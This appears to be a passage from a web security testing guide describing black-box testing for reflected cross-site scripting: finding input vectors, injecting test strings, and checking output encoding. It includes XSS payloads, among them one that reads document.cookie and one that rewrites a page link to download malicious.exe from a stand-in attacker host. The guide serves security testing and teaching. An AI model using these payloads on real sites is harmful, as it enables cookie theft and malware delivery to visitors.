Black-Box Testing
A black-box test will include at least three phases:

Detect Input Vectors
Detect input vectors. For each web page, the tester must determine all the web application’s user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.

Analyze Input Vectors
Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually. Some example of such input data are the following:

<script>alert(123)</script>
“><script>alert(document.cookie)</script>
For a comprehensive list of potential test strings see the XSS Filter Evasion Cheat Sheet.

Check Impact
For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application’s security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.

Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:

> (greater than)
< (less than)
& (ampersand)
' (apostrophe or single quote)
" (double quote)

However, a full list of entities is defined by the HTML and XML specifications. Wikipedia has a complete reference.

Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:

\n (new line)
\r (carriage return)
' (apostrophe or single quote)
" (double quote)
\ (backslash)
\uXXXX (unicode values)

For a more complete reference, see the Mozilla JavaScript guide.

Example 1
For example, consider a site that has a welcome notice Welcome %username% and a download link.

XSS Example 1
Figure 4.7.1-1: XSS Example 1

The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.

Let’s try to click on the following link and see what happens:

http://example.com/index.php?user=<script>alert(123)</script>

If no sanitization is applied this will result in the following popup:

Alert
Figure 4.7.1-2: XSS Example 1

This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody’s browser if he clicks on the tester’s link.

Example 2
Let’s try other piece of code (link):

http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");
AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
This produces the following behavior:

XSS Example 2
Figure 4.7.1-3: XSS Example 2

This will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site he controls.
